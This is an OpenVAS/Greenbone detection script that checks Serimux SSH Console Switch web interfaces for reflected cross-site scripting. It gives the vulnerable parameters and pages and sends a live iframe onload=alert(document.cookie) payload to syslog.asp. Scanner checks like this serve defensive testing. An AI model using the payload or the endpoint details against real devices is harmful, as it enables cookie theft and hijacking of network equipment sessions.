CPE = "cpe:/a:serimux:serimux_console_switch";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807895" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-10-05 16:48:59 +0530 (Wed, 05 Oct 2016)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "Serimux SSH Console Switch Multiple Cross-Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is running Serimux SSH Console Switch
  and is prone to multiple cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to insufficient
  sanitization of input passed via 'PAGE', 'SECTION' and 'PORTNUMBER'
  parameters to 'portconnect.asp, 'tcpsettings.asp', 'syslog.asp',
  'portcnfiguration.asp' and 'systeminfo.asp' scripts." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject arbitrary web script or HTML." );
	script_tag( name: "affected", value: "Serimux SSH Console Switch versions 2.4, 2.3
  2.2 and 2.1" );
	script_tag( name: "solution", value: "The cross site scripting vulnerabilities can be patched by an input
  restriction of the vulnerable parameters, disallow the usage of special chars on input to prevent further
  injection attacks. Parse all parameters separately to resolve the issue." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2016/Oct/5" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2016/Oct/14" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_serimux_ssh_console_switch_detect.sc" );
	script_mandatory_keys( "Serimux/Console/Switch/Installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://www.networktechinc.com/overview/serimux-s-x.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!serPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: serPort )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/nti/syslog.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=t" + "est.source%20onload=alert(document.cookie)%20%3C";
if(http_vuln_check( port: serPort, url: url, check_header: TRUE, pattern: "onload=alert\\(document.cookie\\)", extra_check: make_list( ">Syslog Location",
	 "syslog",
	 ">Administrative Settings" ) )){
	report = http_report_vuln_url( port: serPort, url: url );
	security_message( port: serPort, data: report );
	exit( 0 );
}

